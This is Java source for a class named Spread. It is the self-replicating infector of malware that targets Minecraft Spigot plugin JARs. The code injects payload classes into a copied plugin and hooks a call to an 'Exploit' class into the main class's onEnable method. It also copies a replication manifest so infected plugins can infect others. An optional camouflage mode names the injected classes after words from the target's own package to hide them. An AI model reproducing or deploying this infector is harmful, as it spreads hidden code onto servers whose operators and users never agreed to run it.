package com.tmquan2508.exploit;

import org.apache.commons.lang3.SystemUtils;
import org.yaml.snakeyaml.Yaml;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.JarURLConnection;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

public class Spread {
    private record InjectionPlan(String newPackage, String newPrefix) {}

    private static class CamouflageUtils {
        public record CamouflagePlan(String packageName, String namePrefix) {}
        private static final Random RANDOM = new Random();
        private static final Pattern CAMEL_CASE_SPLIT_PATTERN = Pattern.compile("(?<!(^|[A-Z]))(?=[A-Z])|(?<!^)(?=[A-Z][a-z])");

        public static CamouflagePlan generateCamouflagePlan(File targetJarFile) {
            logMessage("[Camouflage] Analyzing JAR file to generate camouflage plan...");
            Map<String, List<String>> packageStructure = scanJarForPackageStructure(targetJarFile);

            if (packageStructure.isEmpty()) {
                logMessage("[Camouflage] WARNING: Target JAR contains no class files. Using fallback camouflage.");
                return new CamouflagePlan("com/tmquan2508/internal/safe", "InternalTask");
            }

            List<Map.Entry<String, List<String>>> packagesSortedByClassCount = packageStructure.entrySet().stream()
                    .filter(entry -> entry.getKey() != null && !entry.getKey().isEmpty() && !entry.getKey().startsWith("META-INF"))
                    .sorted((e1, e2) -> Integer.compare(e2.getValue().size(), e1.getValue().size()))
                    .collect(Collectors.toList());

            if (packagesSortedByClassCount.isEmpty()) {
                throw new IllegalStateException("Cannot generate camouflage plan: No suitable packages found in target JAR.");
            }

            Map.Entry<String, List<String>> chosenEntry = packagesSortedByClassCount.get(RANDOM.nextInt(Math.min(4, packagesSortedByClassCount.size())));
            String chosenPackagePath = chosenEntry.getKey();
            List<String> classNamesInPackage = chosenEntry.getValue();
            logMessage("[Camouflage] Selected package for camouflage: '" + chosenPackagePath + "'");

            List<String> dictionary = buildWordDictionaryFrom(classNamesInPackage);
            if (dictionary.isEmpty()) {
                logMessage("[Camouflage] WARNING: Could not build a word dictionary. Using fallback prefix 'Task'.");
                return new CamouflagePlan(chosenPackagePath, "Task");
            }
            logMessage("[Camouflage] Built a dictionary with " + dictionary.size() + " words.");

            String namePrefix = buildUniqueWordName(dictionary, classNamesInPackage.stream().map(s -> s.substring(0, s.lastIndexOf('.'))).collect(Collectors.toList()), 1, 2);
            logMessage("[Camouflage] Generated camouflage name prefix: '" + namePrefix + "'");

            return new CamouflagePlan(chosenPackagePath, namePrefix);
        }

        private static List<String> buildWordDictionaryFrom(List<String> classNames) {
            return classNames.stream()
                    .map(className -> className.substring(0, className.lastIndexOf('.')))
                    .flatMap(className -> Arrays.stream(CAMEL_CASE_SPLIT_PATTERN.split(className)))
                    .map(word -> word.replaceAll("[^a-zA-Z0-9]", ""))
                    .filter(word -> word.length() > 2)
                    .distinct()
                    .collect(Collectors.toList());
        }

        private static String buildUniqueWordName(List<String> dictionary, List<String> existingNames, int minWords, int maxWords) {
            String name;
            int attempts = 0;
            do {
                int wordCount = minWords + RANDOM.nextInt(maxWords - minWords + 1);
                StringBuilder nameBuilder = new StringBuilder();
                for (int i = 0; i < wordCount; i++) {
                    nameBuilder.append(dictionary.get(RANDOM.nextInt(dictionary.size())));
                }
                name = nameBuilder.toString();
                if (attempts > 10) {
                    name += attempts;
                }
                attempts++;
            } while (existingNames.contains(name));
            return name;
        }

        private static Map<String, List<String>> scanJarForPackageStructure(File jarFile) {
            Map<String, List<String>> packageMap = new HashMap<>();
            try (ZipFile zipFile = new ZipFile(jarFile)) {
                Enumeration<? extends ZipEntry> entries = zipFile.entries();
                while (entries.hasMoreElements()) {
                    ZipEntry entry = entries.nextElement();
                    if (entry.isDirectory() || !entry.getName().endsWith(".class") || entry.getName().contains("package-info.class")) continue;
                    String fullPath = entry.getName();
                    int lastSlash = fullPath.lastIndexOf('/');
                    String packageName = (lastSlash == -1) ? "" : fullPath.substring(0, lastSlash);
                    packageMap.computeIfAbsent(packageName, k -> new ArrayList<>()).add(fullPath.substring(lastSlash + 1));
                }
            } catch (IOException e) { logMessage("[Camouflage] Error scanning JAR file: " + stackTrace(e)); }
            return packageMap;
        }
    }

    private static class JavassistReflectiveWrapper {
        private static final String JAVASSIST_URL = "https://repo1.maven.org/maven2/org/javassist/javassist/3.29.0-GA/javassist-3.29.0-GA.jar";
        private final URLClassLoader classLoader;

        private final Class<?> classPoolClass;
        private final Class<?> ctClassClass;
        private final Class<?> ctMethodClass;
        private final Class<?> classMapClass;

        private final Method getDefaultPoolMethod;
        private final Method poolGetMethod;
        private final Method poolMakeClassMethod;
        private final Method poolAppendClassPathMethod;
        private final Method ctClassReplaceClassNameMethod;
        private final Method ctClassToBytecodeMethod;
        private final Method ctClassGetNameMethod;
        private final Method ctClassGetDeclaredMethod;
        private final Method ctClassDetachMethod;
        private final Method ctMethodInsertAfterMethod;

        private final Constructor<?> classMapConstructor;


        public JavassistReflectiveWrapper() throws Exception {
            logMessage("[Javassist] Initializing reflective wrapper...");
            this.classLoader = initClassLoader();
            this.classPoolClass = classLoader.loadClass("javassist.ClassPool");
            this.ctClassClass = classLoader.loadClass("javassist.CtClass");
            this.ctMethodClass = classLoader.loadClass("javassist.CtMethod");
            this.classMapClass = classLoader.loadClass("javassist.ClassMap");

            this.classMapConstructor = classMapClass.getConstructor();

            this.getDefaultPoolMethod = classPoolClass.getMethod("getDefault");
            this.poolGetMethod = classPoolClass.getMethod("get", String.class);
            this.poolMakeClassMethod = classPoolClass.getMethod("makeClass", InputStream.class);
            this.poolAppendClassPathMethod = classPoolClass.getMethod("appendClassPath", String.class);

            this.ctClassReplaceClassNameMethod = ctClassClass.getMethod("replaceClassName", classMapClass);
            this.ctClassToBytecodeMethod = ctClassClass.getMethod("toBytecode");
            this.ctClassGetNameMethod = ctClassClass.getMethod("getName");
            this.ctClassGetDeclaredMethod = ctClassClass.getMethod("getDeclaredMethod", String.class);
            this.ctClassDetachMethod = ctClassClass.getMethod("detach");

            this.ctMethodInsertAfterMethod = ctMethodClass.getMethod("insertAfter", String.class);
            logMessage("[Javassist] Reflective wrapper initialized successfully.");
        }

        private URLClassLoader initClassLoader() throws IOException {
            URL url = new URL(JAVASSIST_URL);
            Path tempDir = Files.createTempDirectory("javassist-cache");
            tempDir.toFile().deleteOnExit();
            Path localJarPath = tempDir.resolve("javassist.jar");

            if (!Files.exists(localJarPath)) {
                logMessage("[Javassist] Downloading from " + JAVASSIST_URL);
                try (InputStream in = url.openStream()) {
                    Files.copy(in, localJarPath);
                }
            } else {
                logMessage("[Javassist] Using cached JAR at " + localJarPath);
            }
            return new URLClassLoader(new URL[]{localJarPath.toUri().toURL()}, Spread.class.getClassLoader());
        }

        private Object invoke(Method method, Object obj, Object... args) {
            try {
                return method.invoke(obj, args);
            } catch (IllegalAccessException | InvocationTargetException e) {
                throw new RuntimeException("Failed to invoke method: " + method.getName(), e.getCause() != null ? e.getCause() : e);
            }
        }
        
        public Object createClassMap() {
            try {
                return classMapConstructor.newInstance();
            } catch (InstantiationException | IllegalAccessException | InvocationTargetException e) {
                 throw new RuntimeException("Failed to create new ClassMap instance", e);
            }
        }

        public Object createDefaultClassPool() { return invoke(getDefaultPoolMethod, null); }
        public Object getClassFromPool(Object classPool, String className) { return invoke(poolGetMethod, classPool, className); }
        public Object makeClass(Object classPool, InputStream is) { return invoke(poolMakeClassMethod, classPool, is); }
        public void appendClassPath(Object classPool, String path) { invoke(poolAppendClassPathMethod, classPool, path); }
        public void replaceClassName(Object ctClass, Object classMap) { invoke(ctClassReplaceClassNameMethod, ctClass, classMap); }
        public byte[] toBytecode(Object ctClass) { return (byte[]) invoke(ctClassToBytecodeMethod, ctClass); }
        public String getName(Object ctClass) { return (String) invoke(ctClassGetNameMethod, ctClass); }
        public Object getDeclaredMethod(Object ctClass, String methodName) { return invoke(ctClassGetDeclaredMethod, ctClass, methodName); }
        public void detach(Object ctClass) { invoke(ctClassDetachMethod, ctClass); }
        public void insertAfter(Object ctMethod, String code) { invoke(ctMethodInsertAfterMethod, ctMethod, code); }
    }


    private static void logMessage(String message){ System.out.println(message); }
    private static String stackTrace(Exception e){
        StringWriter sw = new StringWriter(); PrintWriter pw = new PrintWriter(sw); e.printStackTrace(pw); return sw.toString();
    }

    private static List<String> getClassesToInject() throws IOException {
        String resourcePath = "/META-INF/data.bin";
        URL resourceUrl = Spread.class.getResource(resourcePath);
        if (resourceUrl == null) {
            throw new IOException("CRITICAL: Resource " + resourcePath + " not found. The build process may have failed.");
        }

        List<String> classNames = new ArrayList<>();
        try (InputStream is = resourceUrl.openStream();
             DataInputStream dis = new DataInputStream(new BufferedInputStream(is))) {
            
            while (true) {
                try {
                    int length = dis.readInt();
                    byte[] data = new byte[length];
                    dis.readFully(data);
                    classNames.add(new String(data, StandardCharsets.UTF_8));
                } catch (EOFException e) {
                    break;
                }
            }
        }
        
        if (classNames.isEmpty()){
            throw new IOException("CRITICAL: Binary payload " + resourcePath + " is empty or corrupted.");
        }
        return classNames;
    }
    
    public static boolean patchFile(String orig, String out, boolean camouflage) {
        if (camouflage) {
            logMessage("[Spread] Camouflage mode is ENABLED.");
            return patchWithCamouflage(orig, out);
        } else {
            logMessage("[Spread] Camouflage mode is DISABLED. Using standard injection.");
            return patchStandard(orig, out);
        }
    }
    
    private static boolean patchWithCamouflage(String orig, String out) {
        File inputFile = new File(orig);
        if (!inputFile.exists()) return false;
        
        CamouflageUtils.CamouflagePlan plan = CamouflageUtils.generateCamouflagePlan(inputFile);
        InjectionPlan injectionPlan = new InjectionPlan(plan.packageName().replace('/', '.'), plan.namePrefix());
        
        logMessage("[Spread] New Camouflage Plan: Package='" + injectionPlan.newPackage() + "', Prefix='" + injectionPlan.newPrefix() + "'");
        
        return performPatching(orig, out, injectionPlan, "CAMOUFLAGE");
    }

    private static boolean patchStandard(String orig, String out) {
        InjectionPlan injectionPlan = new InjectionPlan("com.tmquan2508.exploit", "");
        
        logMessage("[Spread] Standard Injection Plan: Target Package='" + injectionPlan.newPackage() + "', Target Prefix='<none>'");
        
        return performPatching(orig, out, injectionPlan, "STANDARD");
    }

    private static boolean performPatching(String orig, String out, InjectionPlan plan, String mode) {
        Path input = Paths.get(orig);
        Path output = Paths.get(out);
        if (!Files.exists(input)) return false;

        try {
            Files.copy(input, output, StandardCopyOption.REPLACE_EXISTING);
        } catch (IOException e) {
            logMessage("Error cloning file: " + stackTrace(e));
            return false;
        }

        Map<String, Object> pluginYAML = readPluginYAML(output.toAbsolutePath().toString());
        if (pluginYAML == null) {
            logMessage("Not a valid Spigot plugin.");
            try { Files.delete(output); } catch (IOException e) { /* ignore */ }
            return false;
        }
        String mainClass = (String) pluginYAML.get("main");

        FileSystem outStream = null;
        JavassistReflectiveWrapper javassist;

        try {
            javassist = new JavassistReflectiveWrapper();
            Object pool = javassist.createDefaultClassPool();

            outStream = FileSystems.newFileSystem(output, (ClassLoader) null);
            if (Files.exists(outStream.getPath("/META-INF/data.bin"))) {
                logMessage("Plugin already patched. Skipping.");
                outStream.close();
                return false;
            }

            String originalPackage = Spread.class.getPackage().getName();
            logMessage("[Spread] Determined current package: '" + originalPackage + "'");
            String currentPrefix = "";
            final String SPREAD_BASE_NAME = "Spread";
            String currentSimpleName = Spread.class.getSimpleName();
            if (currentSimpleName.endsWith(SPREAD_BASE_NAME) && !currentSimpleName.equals(SPREAD_BASE_NAME)) {
                currentPrefix = currentSimpleName.substring(0, currentSimpleName.length() - SPREAD_BASE_NAME.length());
            }
            logMessage("[Spread] Determined current name prefix: '" + (currentPrefix.isEmpty() ? "<none>" : currentPrefix) + "'");

            List<String> allEntries = getClassesToInject();
            Object relocationMapObj = javassist.createClassMap();
            @SuppressWarnings("unchecked")
            Map<String, String> relocationMap = (Map<String, String>) relocationMapObj;
            String finalExploitFQN = null;

            logMessage("[Spread] Building relocation map...");
            for (String entry : allEntries) {
                if (!entry.endsWith(".class")) continue;

                String classPathNoExt = entry.replace(".class", "");
                String fqnStylePath = classPathNoExt.replace('/', '.');
                
                String sourceFQN = originalPackage.replace('/', '.') + "." + currentPrefix + fqnStylePath;
                String destFQN = plan.newPackage() + "." + plan.newPrefix() + fqnStylePath;
                
                if (entry.equals("Exploit.class")) {
                    finalExploitFQN = destFQN;
                }
                
                relocationMap.put(sourceFQN, destFQN);
            }
            
            if (finalExploitFQN == null) throw new IllegalStateException("Failed to determine the final FQN for Exploit class.");
            logMessage("[Spread] Relocation map built for " + relocationMap.size() + " classes. Final Exploit FQN: " + finalExploitFQN);

            logMessage("[Spread] Loading all payload bytecode into CtClass objects...");
            Collection<Object> allPayloadClasses = new ArrayList<>();
            ClassLoader classLoader = Spread.class.getClassLoader();
            for (Object sourceNameObj : relocationMap.keySet()) {
                String sourceFQN = (String) sourceNameObj;
                String resourcePath = sourceFQN.replace('.', '/') + ".class";
                try (InputStream is = classLoader.getResourceAsStream(resourcePath)) {
                    if (is == null) throw new IOException("Cannot find payload resource: " + resourcePath);
                    allPayloadClasses.add(javassist.makeClass(pool, is));
                }
            }
            logMessage("[Spread] Stored " + allPayloadClasses.size() + " CtClass objects.");

            logMessage("[Spread] Performing relocation on all loaded classes...");
            for (Object cc : allPayloadClasses) {
                javassist.replaceClassName(cc, relocationMapObj);
            }

            logMessage("[Spread] Writing all modified classes to JAR...");
            for (Object cc : allPayloadClasses) {
                String newFQN = javassist.getName(cc);
                String newPathInJar = newFQN.replace('.', '/') + ".class";
                Path targetPath = outStream.getPath(newPathInJar);
                if (targetPath.getParent() != null) Files.createDirectories(targetPath.getParent());
                Files.write(targetPath, javassist.toBytecode(cc));
            }
            logMessage("[Spread] Finished writing all " + allPayloadClasses.size() + " classes.");

            logMessage("[Spread] Copying replication manifest (data.bin) for the next generation...");
            Path dataBinPath = outStream.getPath("META-INF", "data.bin");
            Files.createDirectories(dataBinPath.getParent());

            URL resourceUrl = Spread.class.getResource("/META-INF/data.bin");
            if (resourceUrl == null) {
                throw new IOException("CRITICAL: Cannot find own data.bin for replication. Spread will fail.");
            }

            try (InputStream dataBinStream = resourceUrl.openStream()) {
                Files.copy(dataBinStream, dataBinPath, StandardCopyOption.REPLACE_EXISTING);
            }
            logMessage("[Spread] Replication manifest copied successfully.");

            logMessage("[Spread] Patching the main plugin class...");
            javassist.appendClassPath(pool, orig);
            
            Object ccMain = javassist.getClassFromPool(pool, mainClass);
            Object m = javassist.getDeclaredMethod(ccMain, "onEnable");
            String injectionCode = String.format("{ try { new %s((org.bukkit.plugin.Plugin)this); } catch (Throwable t) { t.printStackTrace(); } }", finalExploitFQN);

            logMessage("[Spread] Injecting code: " + injectionCode);
            javassist.insertAfter(m, injectionCode);

            Files.write(outStream.getPath(mainClass.replace('.', '/') + ".class"), javassist.toBytecode(ccMain), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);
            
            javassist.detach(ccMain);
            
            for (Object cc : allPayloadClasses) {
                javassist.detach(cc);
            }

            logMessage("Successfully patched with " + mode + " injection: " + output.getFileName());

        } catch (Exception e) {
            logMessage("A critical error occurred during " + mode + " patching process.\n" + stackTrace(e));
            try { 
                if (outStream != null) outStream.close(); 
                Files.deleteIfExists(output); 
            }
            catch (IOException ex) { 
                logMessage("Error during cleanup: " + stackTrace(ex)); 
            }
            return false;
        } finally {
            if (outStream != null) try { outStream.close(); } catch (IOException e) { /* Ignore */ }
        }
        return true;
    }

    private static Map<String, Object> readPluginYAML(String path) {
        Yaml yamlData = new Yaml(); InputStream is = null;
        String inputFile = null;
        if (SystemUtils.IS_OS_LINUX || SystemUtils.IS_OS_MAC) inputFile = "jar:file://" + path + "!/plugin.yml";
        if (SystemUtils.IS_OS_WINDOWS) inputFile = "jar:file:/" + path + "!/plugin.yml";
        try {
            if (inputFile != null) {
                JarURLConnection connection = (JarURLConnection) new URL(inputFile).openConnection();
                connection.setUseCaches(false); is = connection.getInputStream();
            }
        } catch (IOException e) { return null; }
        if (is == null) return null;
        try (InputStream finalIs = is) { return yamlData.load(finalIs); } catch (Exception e) { return null; }
    }
}